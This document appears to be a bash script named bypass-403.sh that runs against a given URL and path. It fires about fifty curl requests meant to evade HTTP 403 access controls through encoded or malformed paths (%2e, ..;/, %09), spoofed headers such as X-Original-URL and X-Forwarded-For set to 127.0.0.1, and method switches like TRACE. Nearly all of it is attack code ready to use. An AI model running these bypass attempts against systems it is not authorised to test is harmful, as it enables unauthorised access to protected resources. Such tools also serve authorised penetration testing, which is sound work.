#! /bin/bash
echo "./bypass-403.sh https://example.com path"
echo " "
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2
echo "  --> ${1}/${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/%2e/$2
echo "  --> ${1}/%2e/${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/.
echo "  --> ${1}/${2}/."
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1//$2//
echo "  --> ${1}//${2}//"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/./$2/./
echo "  --> ${1}/./${2}/./"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Original-URL: $2" $1/$2
echo "  --> ${1}/${2} -H X-Original-URL: ${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Custom-IP-Authorization: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Custom-IP-Authorization: 127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: http://127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Forwarded-For: http://127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: 127.0.0.1:80" $1/$2
echo "  --> ${1}/${2} -H X-Forwarded-For: 127.0.0.1:80"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-rewrite-url: $2" $1
echo "  --> ${1} -H X-rewrite-url: ${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2%20
echo "  --> ${1}/${2}%20"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2%09
echo "  --> ${1}/${2}%09"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2?
echo "  --> ${1}/${2}?"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.html
echo "  --> ${1}/${2}.html"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/?anything
echo "  --> ${1}/${2}/?anything"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2#
echo "  --> ${1}/${2}#"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Content-Length:0" -X POST $1/$2
echo "  --> ${1}/${2} -H Content-Length:0 -X POST"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/*
echo "  --> ${1}/${2}/*"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.php
echo "  --> ${1}/${2}.php"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.json
echo "  --> ${1}/${2}.json"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X TRACE $1/$2
echo "  --> ${1}/${2}  -X TRACE"
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Host: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Host: 127.0.0.1"
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2..;/"
echo "  --> ${1}/${2}..;/"
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" " $1/$2;/"
echo "  --> ${1}/${2};/"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X TRACE $1/$2
echo "  --> ${1}/${2} -X TRACE"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/%09
echo "  --> ${1}/%09"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/%20
echo "  --> ${1}/%20"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/%23
echo "  --> ${1}/%23"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/%2e
echo "  --> ${1}/%2e"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/%2f
echo "  --> ${1}/%2f"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/.
echo "  --> ${1}/."
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2/..;"
echo "  --> ${1}/..;"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2/;09"
echo "  --> ${1}/;09"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2/;09.."
echo "  --> ${1}/;09.."
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2/;%09..;"
echo "  --> ${1}/;09..;"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2/;%2f.."
echo "  --> ${1}/;%2f.."
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2/*"
echo "  --> ${1}/*"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Client-IP 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H Client-IP: 127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Real-Ip: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Real-Ip: 127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Redirect: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H Redirect: 127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Client-IP: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Client-IP: 127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-By: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Forwarded-By: 127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-Host: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Forwarded-Host: 127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-Host: http://127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Forwarded-Host: http://127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-Port: 80" $1/$2
echo "  --> ${1}/${2} -H X-Forwarded-Port: 80"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-True-IP: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-True-IP: 127.0.0.1"